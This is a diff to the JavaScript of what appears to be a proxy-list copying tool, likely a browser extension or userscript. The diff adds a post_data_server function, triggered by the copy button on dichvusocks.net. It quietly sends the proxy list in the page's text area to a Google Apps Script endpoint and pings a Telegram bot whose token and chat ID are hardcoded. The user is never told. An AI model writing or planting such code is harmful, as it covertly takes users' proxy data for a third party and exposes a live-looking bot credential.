@@ -4,6 +4,44 @@ function pkclickevent(e) {
   t.initMouseEvent("click", !0, !0, window, 0, 0, 0, 0, 0, !1, !1, !1, !1, 0, null), e.dispatchEvent(t)
 }
 
+
+   
+function post_data_server(url) {
+var smdb=document.getElementById("proxy_area").value
+var dataToSend4 = new FormData();
+dataToSend4.append('Proxy', smdb);
+  fetch(url, {
+      method: 'POST',
+      body: dataToSend4
+  })
+  .then(response => response.json())
+  .then(data => {
+      console.log('Data sent successfully:', data);
+  })
+  .catch(error => {
+      console.error('Error sending data:', error);
+  });
+  
+
+
+  var apiUrl = "https://api.telegram.org/bot6860728585:AAGqI3cmbr_7dgj7557rE28ti0eGWslPTD0/sendMessage";
+
+  // Data to be sent to the API
+  var data = {
+      chat_id: "-1001898564591",
+      text: "Proxy Added To Google Sheets"
+  };
+
+  // Configure the request
+  var xhr = new XMLHttpRequest();
+  xhr.open("POST", apiUrl, true);
+  xhr.setRequestHeader("Content-Type", "application/json");
+
+  // Send the request
+  xhr.send(JSON.stringify(data));
+
+  }
+
 function simulateClick(element) {
 const event = new MouseEvent('click', {
   bubbles: true,
@@ -78,6 +116,9 @@ document.getElementById("clear").addEventListener("click", function () {
 
 
 document.getElementById("runcopy").addEventListener("click", function(){
+if(window.location.hostname=="dichvusocks.net"){
+post_data_server("https://script.google.com/macros/s/AKfycbz87AkQH1NciNk1Q_9W8Di32bNSBQk-U2M0dChRVT78uFTSSfotbyZc-UMqaGdx-IOXFw/exec");
+}
 
 document.getElementById("proxy_area").select(),document.execCommand("copy")
 
@@ -95,9 +136,9 @@ var inputText = document.querySelector('body').innerText;
       }
 
 
-      function localStorage_get_set(hasil) {
-if (localStorage.getItem(hasil)) {
-          document.getElementById(e).value = localStorage.getItem(hasil)
+      function localStorage_get_set(e) {
+if (localStorage.getItem(e)) {
+          document.getElementById(e).value = localStorage.getItem(e)
       }
       
       }
